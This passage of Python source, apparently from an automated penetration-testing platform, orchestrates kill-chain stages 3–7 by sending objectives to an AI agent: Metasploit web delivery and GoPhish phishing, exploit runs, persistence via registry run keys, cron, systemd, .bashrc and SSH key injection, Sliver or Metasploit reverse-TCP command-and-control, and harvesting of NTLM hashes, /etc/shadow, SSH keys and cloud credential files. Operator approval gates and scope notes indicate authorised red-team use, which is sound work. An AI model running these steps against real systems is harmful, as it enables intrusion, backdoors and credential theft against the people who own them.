                logger.exception(f"Stage {stage} agent connection error")
                yield False, f"Stage {stage} agent unreachable. Is the agent service running at {self.agent_api_url}?"
            except Exception as e:
                logger.exception(f"Stage {stage} error")
                yield False, f"Stage {stage} error: {e}"

    async def run_stage_3(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 3: Delivery - invoke headless agent to start web delivery"""
        self._current_stage = 3
        self._status = KillChainStatus.RUNNING
        self._current_sub_step = "3.1 Start Listener"
        await self._persist_state()

        payload_ref = self._payload_ref or {}
        attack_path = self._selected_attack_path or {}
        lhost = ""
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                proj_resp = await client.get(f"{self.webapp_api_url}/api/projects/{self.project_id}")
                if proj_resp.status_code == 200:
                    proj = proj_resp.json()
                    lhost = (proj.get("agentLhost") or "").strip()
        except Exception:
            pass

        if not lhost:
            lhost = os.getenv("KILL_CHAIN_LHOST", "").strip()
        lport = "4444"

        # LHOST is required for listener/delivery; skip Stage 3 gracefully if missing
        if not lhost:
            yield KillChainLogEvent(
                log="[!] LHOST not configured — skipping Stage 3: Delivery. Set agentLhost in project settings or KILL_CHAIN_LHOST env to enable payload delivery.",
                timestamp=datetime.utcnow(),
                stage=3,
                stageName="Delivery",
                subStep="Skipped - No LHOST",
                level="warning",
            )
            async for ev in self._transition_to_next_stage(3, 4):
                yield ev
            return

        objective = (
            "Start Metasploit multi/handler listener and web delivery. "
            f"Use LHOST={lhost} LPORT={lport}. "
            "If attack path has a CVE, prepare exploit module."
        )
        if attack_path:
            cve_ids = attack_path.get("cveIds", [])
            if cve_ids:
                objective += f" Top CVE: {cve_ids[0]}."
            metasploit_hint = attack_path.get("metasploitHint", "")
            if metasploit_hint:
                objective += f" Hint: {metasploit_hint}"

        # --- GoPhish phishing delivery (optional) ---
        # Probe GoPhish admin API; include phishing instructions only when available
        gophish_url = os.getenv("GOPHISH_ADMIN_URL", "http://gophish:3333")
        gophish_available = False
        try:
            async with httpx.AsyncClient(timeout=4, verify=False) as client:
                resp = await client.get(f"{gophish_url}/api/campaigns/?api_key=gophish")
                gophish_available = resp.status_code < 500
        except Exception:
            pass

        if gophish_available:
            yield KillChainLogEvent(
                log="[+] GoPhish is available — phishing delivery enabled for Stage 3",
                timestamp=datetime.utcnow(),
                stage=3,
                stageName="Delivery",
                subStep="3.1a GoPhish Detected",
                level="success",
            )
            objective += (
                " Additionally, GoPhish is available at http://gophish:3333 (default API key: 'gophish'). "
                "Create a phishing campaign: POST /api/campaigns/ with a landing page that delivers "
                f"the payload at http://{lhost}:{lport}/payload. "
                "Record the campaign ID in the graph via ingest_custom_findings."
            )
        else:
            yield KillChainLogEvent(
                log="[*] GoPhish not available (profile 'phishing' not enabled) — using web delivery only",
                timestamp=datetime.utcnow(),
                stage=3,
                stageName="Delivery",
                subStep="3.1a No GoPhish",
                level="info",
            )

        yield KillChainLogEvent(
            log="[*] Invoking agent for Stage 3: Delivery...",
            timestamp=datetime.utcnow(),
            stage=3,
            stageName="Delivery",
            subStep="3.1 Start Agent",
            subStepNumber=1,
            toolName="agent",
            level="action",
        )

        async for success, err in self._run_agent_stage(3, "Delivery", objective, {"attack_path": attack_path, "payload_ref": payload_ref}):
            if not success:
                self._status = KillChainStatus.ERROR
                self._error = err
                yield KillChainLogEvent(log=f"[!] Stage 3 failed: {err}", timestamp=datetime.utcnow(), stage=3, stageName="Delivery", subStep="Error", level="error")
                return
            yield KillChainLogEvent(log="[+] Stage 3 complete", timestamp=datetime.utcnow(), stage=3, stageName="Delivery", subStep="Complete", level="success")
            break

        if self._stop_requested:
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return

        async for ev in self._transition_to_next_stage(3, 4):
            yield ev

    async def run_stage_4(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 4: Exploitation - run exploit against top attack path"""
        self._current_stage = 4
        self._current_sub_step = "4.1 Awaiting Operator Approval"
        await self._persist_state()
        attack_path = self._selected_attack_path or {}

        # ── HITL: pause and request operator approval ──────────────────────────
        cve_ids = attack_path.get("cveIds", [])
        target_ip = attack_path.get("targetIp") or attack_path.get("targetHost") or "unknown"
        target_os = (attack_path.get("targetOS") or attack_path.get("os") or "unknown")
        briefing = {
            "stage": 4,
            "stageName": "Exploitation",
            "summary": (
                f"Agent Zero will attempt to exploit {target_ip} using Metasploit. "
                f"Target OS: {target_os}. CVEs: {', '.join(cve_ids) if cve_ids else 'None identified'}."
            ),
            "proposedActions": [
                f"Search for exploit module matching CVE(s): {', '.join(cve_ids) if cve_ids else 'top attack path'}",
                f"Configure RHOSTS={target_ip}, set RPORT and TARGET",
                "Execute exploit and attempt to obtain Meterpreter/shell session",
                "Report session status (opened / failed)",
            ],
            "riskLevel": "HIGH",
            "scopeNote": f"Exploitation will send active payloads to {target_ip}. Confirm target is in scope.",
            "attackPath": attack_path,
        }
        yield KillChainLogEvent(
            log=f"[⏸] Stage 4: Exploitation — waiting for operator approval before proceeding",
            timestamp=datetime.utcnow(), stage=4, stageName="Exploitation",
            subStep="4.0 Awaiting Operator", level="action",
        )
        hitl_action, operator_instructions = await self._wait_for_operator_input(4, "Exploitation", briefing)
        if hitl_action == "stop":
            yield KillChainLogEvent(log="[■] Engagement stopped by operator at Stage 4", timestamp=datetime.utcnow(), stage=4, stageName="Exploitation", subStep="Stopped", level="warning")
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return
        if hitl_action == "skip":
            yield KillChainLogEvent(log="[>>] Stage 4: Exploitation skipped by operator", timestamp=datetime.utcnow(), stage=4, stageName="Exploitation", subStep="Skipped", level="info")
            async for ev in self._transition_to_next_stage(4, 5):
                yield ev
            return
        yield KillChainLogEvent(
            log=f"[✓] Operator approved Stage 4{': ' + operator_instructions if operator_instructions else ''}",
            timestamp=datetime.utcnow(), stage=4, stageName="Exploitation", subStep="Approved", level="success",
        )
        # ── End HITL ────────────────────────────────────────────────────────────

        objective = (
            "Exploit the top attack path using Metasploit. "
            "Search for the exploit module, configure RHOSTS/RPORT/TARGET, run the exploit. "
            "If you obtain a Meterpreter or shell session, report 'Session opened'. "
            "If no session after reasonable attempts, report 'Attempted N exploits, 0 sessions' and complete."
        )
        if attack_path:
            if cve_ids:
                objective += f" CVE: {cve_ids[0]}."
            if target_ip and target_ip != "unknown":
                objective += f" Target: {target_ip}."
        if operator_instructions:
            objective += f"\n\nOperator instructions: {operator_instructions}"

        yield KillChainLogEvent(
            log="[*] Invoking agent for Stage 4: Exploitation...",
            timestamp=datetime.utcnow(),
            stage=4,
            stageName="Exploitation",
            subStep="4.1 Search Module",
            toolName="agent",
            level="action",
        )

        async for success, err in self._run_agent_stage(4, "Exploitation", objective, {"attack_path": attack_path}):
            if not success:
                self._status = KillChainStatus.ERROR
                self._error = err
                yield KillChainLogEvent(log=f"[!] Stage 4 failed: {err}", timestamp=datetime.utcnow(), stage=4, stageName="Exploitation", subStep="Error", level="error")
                return
            yield KillChainLogEvent(log="[+] Stage 4 complete", timestamp=datetime.utcnow(), stage=4, stageName="Exploitation", subStep="Complete", level="success")
            if not self._session_obtained:
                yield KillChainLogEvent(
                    log="[*] No session confirmed; Stages 5–7 may run abbreviated (agent will skip if no session)",
                    timestamp=datetime.utcnow(),
                    stage=4,
                    stageName="Exploitation",
                    subStep="Note",
                    level="info",
                )
            break

        if self._stop_requested:
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return

        async for ev in self._transition_to_next_stage(4, 5):
            yield ev

    async def run_stage_5(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 5: Installation - run persistence if session exists"""
        self._current_stage = 5
        self._current_sub_step = "5.1 Awaiting Operator Approval"
        await self._persist_state()

        attack_path = self._selected_attack_path or {}
        target_os = (attack_path.get("targetOS") or attack_path.get("os") or "unknown").lower()
        target_ip = attack_path.get("targetIp") or attack_path.get("targetHost") or "unknown"

        # ── HITL ──────────────────────────────────────────────────────────────
        persist_options = (
            ["Registry Run key", "Scheduled task", "WMI subscription", "Startup folder"] if "windows" in target_os
            else ["Cron job", "Systemd service", ".bashrc injection", "SSH key injection"] if "linux" in target_os
            else ["Cron / Registry Run key", "Shell-to-Meterpreter", "SSH key injection"]
        )
        briefing = {
            "stage": 5,
            "stageName": "Installation",
            "summary": (
                f"Agent Zero will install persistent backdoor access on {target_ip} (OS: {target_os}). "
                f"{'Active session available.' if self._session_obtained else 'No active session — persistence may be skipped.'}"
            ),
            "proposedActions": [
                f"Attempt persistence technique: {persist_options[0]}",
                f"Fallback options: {', '.join(persist_options[1:])}",
                "Verify persistence by closing and re-opening connection",
                f"Record method via POST /api/graph/persistence",
            ],
            "riskLevel": "CRITICAL",
            "scopeNote": f"Persistence installs a backdoor on {target_ip}. Confirm this is authorized in the engagement scope.",
            "sessionObtained": self._session_obtained,
        }
        yield KillChainLogEvent(
            log=f"[⏸] Stage 5: Installation — waiting for operator approval before proceeding",
            timestamp=datetime.utcnow(), stage=5, stageName="Installation",
            subStep="5.0 Awaiting Operator", level="action",
        )
        hitl_action, operator_instructions = await self._wait_for_operator_input(5, "Installation", briefing)
        if hitl_action == "stop":
            yield KillChainLogEvent(log="[■] Engagement stopped by operator at Stage 5", timestamp=datetime.utcnow(), stage=5, stageName="Installation", subStep="Stopped", level="warning")
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return
        if hitl_action == "skip":
            yield KillChainLogEvent(log="[>>] Stage 5: Installation skipped by operator", timestamp=datetime.utcnow(), stage=5, stageName="Installation", subStep="Skipped", level="info")
            async for ev in self._transition_to_next_stage(5, 6):
                yield ev
            return
        yield KillChainLogEvent(
            log=f"[✓] Operator approved Stage 5{': ' + operator_instructions if operator_instructions else ''}",
            timestamp=datetime.utcnow(), stage=5, stageName="Installation", subStep="Approved", level="success",
        )
        # ── End HITL ────────────────────────────────────────────────────────────

        self._current_sub_step = "5.1 Run Post Module"

        # Build OS-aware persistence catalog
        if "windows" in target_os:
            persistence_techniques = (
                "Windows persistence options (try in order until one succeeds): "
                "1) Meterpreter: run post/windows/manage/persistence_exe (registry HKCU Run key). "
                "2) Scheduled task: run post/windows/manage/scheduledtask (schtasks /create). "
                "3) WMI subscription: run post/windows/manage/wmi_persistence. "
                "4) Registry run key: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. "
                "5) Startup folder: copy payload to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. "
            )
        elif "linux" in target_os or "unix" in target_os:
            persistence_techniques = (
                "Linux persistence options (try in order until one succeeds): "
                "1) Cron: run post/multi/manage/shell_to_meterpreter, then crontab -e '@reboot /path/payload &'. "
                "2) Systemd service: write /etc/systemd/system/sysupdate.service with ExecStart pointing to payload. "
                "3) .bashrc / .profile: append 'nohup /path/payload &' to ~/.bashrc. "
                "4) SSH authorized_keys: append attacker public key to ~/.ssh/authorized_keys for key-based persistence. "
            )
        else:
            persistence_techniques = (
                "Cross-platform persistence options: "
                "1) Meterpreter: run post/multi/manage/shell_to_meterpreter then post/windows/manage/persistence_exe. "
                "2) Cron (Linux): crontab -e '@reboot /path/payload &'. "
                "3) Registry Run key (Windows): reg add HKCU\\...\\Run. "
                "4) SSH key injection: append public key to ~/.ssh/authorized_keys. "
            )

        objective = (
            f"Install persistent access on the target. "
            f"{persistence_techniques}"
            "After establishing persistence, call POST /api/graph/persistence with "
            f"projectId={self.project_id}, userId={self.user_id}, method=<technique_used>, "
            "targetIp=<target_ip>, sessionId=<session_id_if_any>. "
            "Verify persistence by closing and re-opening a connection if possible. "
            "If no active session, report 'Skipped (no session)' and return immediately."
        )
        if operator_instructions:
            objective += f"\n\nOperator instructions: {operator_instructions}"

        yield KillChainLogEvent(
            log="[*] Invoking agent for Stage 5: Installation...",
            timestamp=datetime.utcnow(),
            stage=5,
            stageName="Installation",
            subStep="5.1 Run Post Module",
            toolName="agent",
            level="action",
        )

        async for success, err in self._run_agent_stage(5, "Installation", objective, {"session_obtained": self._session_obtained}):
            if not success:
                yield KillChainLogEvent(log=f"[!] Stage 5: {err}", timestamp=datetime.utcnow(), stage=5, stageName="Installation", subStep="Error", level="warning")
            else:
                yield KillChainLogEvent(log="[+] Stage 5 complete", timestamp=datetime.utcnow(), stage=5, stageName="Installation", subStep="Complete", level="success")
            break

        if self._stop_requested:
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return

        async for ev in self._transition_to_next_stage(5, 6):
            yield ev

    async def run_stage_6(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 6: C2 - establish and manage command-and-control channel"""
        self._current_stage = 6
        self._current_sub_step = "6.1 Awaiting Operator Approval"
        await self._persist_state()

        lhost = os.getenv("KILL_CHAIN_LHOST", "").strip()

        # Probe Sliver availability
        sliver_available = False
        sliver_host = os.getenv("SLIVER_HOST", "sliver")
        sliver_port = os.getenv("SLIVER_HTTP_PORT", "8888")
        try:
            async with httpx.AsyncClient(timeout=4) as client:
                resp = await client.get(f"http://{sliver_host}:{sliver_port}/")
                sliver_available = resp.status_code < 500
        except Exception:
            pass

        # ── HITL ──────────────────────────────────────────────────────────────
        c2_framework = "Sliver" if sliver_available else "Metasploit multi/handler"
        briefing = {
            "stage": 6,
            "stageName": "C2",
            "summary": (
                f"Agent Zero will establish a Command & Control channel using {c2_framework}. "
                f"LHOST: {lhost or '(not configured — set agentLhost in project settings)'}. "
                f"{'Active session available.' if self._session_obtained else 'No active session — C2 setup may be limited.'}"
            ),
            "proposedActions": (
                [
                    f"Start Sliver HTTPS listener on 0.0.0.0:443",
                    f"Generate beacon implant (LHOST={lhost or 'YOUR_IP'}, beacon_interval=60s)",
                    "Deliver implant via Metasploit web_delivery or phishing",
                    "Verify beacon check-in via list_sessions()",
                ] if sliver_available else [
                    "List active Metasploit sessions",
                    "Migrate to stable process (explorer.exe / bash)",
                    "Set up persistent multi/handler (ExitOnSession false)",
                    "Record C2 establishment",
                ]
            ),
            "riskLevel": "CRITICAL",
            "scopeNote": "C2 establishes a persistent communication channel. Confirm C2 infrastructure is authorized.",
            "c2Framework": c2_framework,
            "lhost": lhost,
        }
        yield KillChainLogEvent(
            log=f"[⏸] Stage 6: C2 — waiting for operator approval before proceeding",
            timestamp=datetime.utcnow(), stage=6, stageName="C2",
            subStep="6.0 Awaiting Operator", level="action",
        )
        hitl_action, operator_instructions = await self._wait_for_operator_input(6, "C2", briefing)
        if hitl_action == "stop":
            yield KillChainLogEvent(log="[■] Engagement stopped by operator at Stage 6", timestamp=datetime.utcnow(), stage=6, stageName="C2", subStep="Stopped", level="warning")
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return
        if hitl_action == "skip":
            yield KillChainLogEvent(log="[>>] Stage 6: C2 skipped by operator", timestamp=datetime.utcnow(), stage=6, stageName="C2", subStep="Skipped", level="info")
            async for ev in self._transition_to_next_stage(6, 7):
                yield ev
            return
        yield KillChainLogEvent(
            log=f"[✓] Operator approved Stage 6{': ' + operator_instructions if operator_instructions else ''}",
            timestamp=datetime.utcnow(), stage=6, stageName="C2", subStep="Approved", level="success",
        )
        # ── End HITL ────────────────────────────────────────────────────────────

        self._current_sub_step = "6.1 Start C2 Listener"

        if sliver_available:
            yield KillChainLogEvent(
                log="[+] Sliver C2 detected — using Sliver for Stage 6",
                timestamp=datetime.utcnow(), stage=6, stageName="C2",
                subStep="6.1 Sliver Detected", level="success",
            )
            objective = (
                f"Establish a Sliver C2 channel using the 'sliver' MCP tool. "
                f"1) Call start_listener(listener_type='https', lhost='0.0.0.0', lport=443). "
                f"2) Call generate_implant(lhost='{lhost or 'YOUR_IP'}', lport=443, os_type=<target_os>, "
                f"   implant_format='exe', implant_type='beacon', beacon_interval=60, beacon_jitter=30). "
                f"3) Deliver the implant using the Metasploit web_delivery module or phishing. "
                f"4) Call list_sessions() to confirm beacon check-in. "
                f"5) Record the session via POST /api/graph/actions with actionType='c2_established', "
                f"   projectId={self.project_id}, userId={self.user_id}. "
                "If Sliver is unavailable, fall back to Metasploit multi/handler sessions."
            )
        else:
            yield KillChainLogEvent(
                log="[*] Sliver not available — using Metasploit for C2 (start Sliver with --profile sliver)",
                timestamp=datetime.utcnow(), stage=6, stageName="C2",
                subStep="6.1 MSF Fallback", level="info",
            )
            objective = (
                "Establish C2 using Metasploit: "
                "1) Run 'sessions' to list active Meterpreter/shell sessions. "
                "2) For each session: run 'sessions -i <id>' then 'sysinfo' to fingerprint. "
                "3) Migrate to a stable process: run 'migrate -N explorer.exe' (Windows) or "
                "   'migrate -N bash' (Linux). "
                "4) Set up a persistent handler: use exploit/multi/handler, set payload "
                "   windows/meterpreter/reverse_tcp, set ExitOnSession false, run -j. "
                f"5) Record C2 establishment via POST /api/graph/actions with actionType='c2_established', "
                f"   projectId={self.project_id}, userId={self.user_id}. "
                "If no sessions exist, report 'No active sessions — C2 not established'."
            )
        if operator_instructions:
            objective += f"\n\nOperator instructions: {operator_instructions}"

        yield KillChainLogEvent(
            log="[*] Invoking agent for Stage 6: C2...",
            timestamp=datetime.utcnow(),
            stage=6,
            stageName="C2",
            subStep="6.1 List Listeners",
            toolName="agent",
            level="action",
        )

        async for success, err in self._run_agent_stage(6, "C2", objective, {}):
            if not success:
                yield KillChainLogEvent(log=f"[!] Stage 6: {err}", timestamp=datetime.utcnow(), stage=6, stageName="C2", subStep="Error", level="warning")
            else:
                yield KillChainLogEvent(log="[+] Stage 6 complete", timestamp=datetime.utcnow(), stage=6, stageName="C2", subStep="Complete", level="success")
            break

        if self._stop_requested:
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return

        async for ev in self._transition_to_next_stage(6, 7):
            yield ev

    async def run_stage_7(self) -> AsyncGenerator[KillChainLogEvent, None]:
        """Stage 7: Actions on Objectives - record action"""
        self._current_stage = 7
        self._current_sub_step = "7.1 Awaiting Operator Approval"
        await self._persist_state()

        attack_path = self._selected_attack_path or {}
        target_ip = attack_path.get("targetIp") or attack_path.get("targetHost") or "unknown"
        target_os = (attack_path.get("targetOS") or attack_path.get("os") or "unknown").lower()

        # ── HITL ──────────────────────────────────────────────────────────────
        exfil_items = (
            ["Credential dump (hashdump)", "Screenshot", "Environment vars", "NTLM hashes", "Exfil marker file"]
            if "windows" in target_os
            else ["/etc/passwd + /etc/shadow", "SSH key harvest", "Container escape check", "Credential files (.aws, .pgpass)", "Exfil marker file"]
            if "linux" in target_os
            else ["Environment variables", "Credential files", "SSH keys", "Exfil marker file"]
        )
        briefing = {
            "stage": 7,
            "stageName": "Actions on Objectives",
            "summary": (
                f"Agent Zero will execute post-exploitation data collection on {target_ip} (OS: {target_os}). "
                f"This is the final stage of the kill chain. "
                f"{'Active session available — full data collection possible.' if self._session_obtained else 'No active session — recon-mode data collection only.'}"
            ),
            "proposedActions": [f"Collect: {item}" for item in exfil_items[:4]] + [
                f"Ingest findings via ingest_custom_findings()",
                f"Record kill chain completion via POST /api/graph/actions",
            ],
            "riskLevel": "CRITICAL",
            "scopeNote": (
                f"Data collection on {target_ip} will access sensitive system information. "
                "Confirm data handling procedures and exfil scope are authorized."
            ),
            "sessionObtained": self._session_obtained,
        }
        yield KillChainLogEvent(
            log=f"[⏸] Stage 7: Actions on Objectives — waiting for operator approval before proceeding",
            timestamp=datetime.utcnow(), stage=7, stageName="Actions on Objectives",
            subStep="7.0 Awaiting Operator", level="action",
        )
        hitl_action, operator_instructions = await self._wait_for_operator_input(7, "Actions on Objectives", briefing)
        if hitl_action == "stop":
            yield KillChainLogEvent(log="[■] Engagement stopped by operator at Stage 7", timestamp=datetime.utcnow(), stage=7, stageName="Actions on Objectives", subStep="Stopped", level="warning")
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            return
        if hitl_action == "skip":
            yield KillChainLogEvent(log="[>>] Stage 7: Actions on Objectives skipped by operator", timestamp=datetime.utcnow(), stage=7, stageName="Actions on Objectives", subStep="Skipped", level="info")
            self._completed_at = datetime.utcnow()
            self._status = KillChainStatus.COMPLETED
            await self._persist_state()
            return
        yield KillChainLogEvent(
            log=f"[✓] Operator approved Stage 7{': ' + operator_instructions if operator_instructions else ''}",
            timestamp=datetime.utcnow(), stage=7, stageName="Actions on Objectives", subStep="Approved", level="success",
        )
        # ── End HITL ────────────────────────────────────────────────────────────

        self._current_sub_step = "7.1 Actions on Objectives"

        if "windows" in target_os:
            gather_steps = (
                "Windows post-exploitation gather steps: "
                "1) run post/windows/gather/enum_system — OS, hostname, domain, users. "
                "2) run post/multi/gather/env — environment variables (may contain credentials). "
                "3) run post/windows/gather/credentials/credential_collector — harvest creds from common stores. "
                "4) run hashdump — dump NTLM hashes from SAM database. "
                "5) run post/windows/gather/screenshot — screenshot of the desktop for proof. "
                "6) Write a test exfil file: run shell, then 'echo PandaExploit-Pwned > C:\\\\Users\\\\Public\\\\pwned.txt'. "
            )
        elif "linux" in target_os or "unix" in target_os:
            gather_steps = (
                "Linux post-exploitation gather steps: "
                "1) run post/multi/gather/env — environment variables (may contain credentials/tokens). "
                "2) run shell, then: cat /etc/passwd; cat /etc/shadow (if root); id; whoami; uname -a. "
                "3) run post/linux/gather/credentials — SSH keys, bash history, .pgpass, .aws/credentials. "
                "4) run post/multi/gather/ssh_creds — gather SSH private keys from home dirs. "
                "5) Check for container escape: cat /proc/1/cgroup; ls /.dockerenv. "
                "6) Write a test exfil file: run shell 'echo PandaExploit-Pwned > /tmp/pwned.txt'. "
            )
        else:
            gather_steps = (
                "Cross-platform post-exploitation gather steps: "
                "1) run post/multi/gather/env — environment variables. "
                "2) run shell — check id/whoami, uname/ver, hostname. "
                "3) run post/multi/gather/ssh_creds — SSH key harvest. "
                "4) Write a test exfil marker: echo PandaExploit-Pwned > /tmp/pwned.txt or equivalent. "
            )

        objective = (
            f"Execute Actions on Objectives against {target_ip}. "
            f"{gather_steps}"
            "After gathering, ingest all findings: call ingest_custom_findings with "
            "severity='critical', title='Post-Exploitation: <technique>', description=<output_summary>. "
            f"Finally, record the completed kill chain: POST /api/graph/actions with "
            f"projectId={self.project_id}, userId={self.user_id}, actionType='exfil', "
            f"targetIp={target_ip}, description='Kill chain complete — data gathered and recorded'. "
            "If no session is available, use actionType='recon' and record what was achieved."
        )
        if operator_instructions:
            objective += f"\n\nOperator instructions: {operator_instructions}"

        yield KillChainLogEvent(
            log="[*] Invoking agent for Stage 7: Actions on Objectives...",
            timestamp=datetime.utcnow(),
            stage=7,
            stageName="Actions on Objectives",
            subStep="7.1 Record Action",
            toolName="agent",
            level="action",
        )

        async for success, err in self._run_agent_stage(7, "Actions on Objectives", objective, {}):
            if not success:
                yield KillChainLogEvent(log=f"[!] Stage 7: {err}", timestamp=datetime.utcnow(), stage=7, stageName="Actions on Objectives", subStep="Error", level="warning")
            else:
                yield KillChainLogEvent(log="[+] Stage 7 complete", timestamp=datetime.utcnow(), stage=7, stageName="Actions on Objectives", subStep="Complete", level="success")
            break

        self._completed_at = datetime.utcnow()
        self._status = KillChainStatus.COMPLETED
        await self._persist_state()
        await self._generate_report()
